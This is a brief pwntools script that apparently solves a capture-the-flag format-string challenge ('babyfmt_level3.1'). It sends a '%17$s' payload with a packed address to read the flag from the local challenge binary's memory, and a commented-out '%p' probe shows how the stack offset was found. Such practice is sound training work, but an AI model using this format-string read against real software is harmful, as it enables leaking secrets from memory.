from pwn import *

flag_addr = 0x4040d0

io = process("/challenge/babyfmt_level3.1")

io.recvuntil(b"data!")
#payload = b'BAAAAAAAA' + b" %p" * 30
# offset = 16
payload = b"%17$sAAAA" + p64(flag_addr)
io.sendline(payload)

io.interactive()
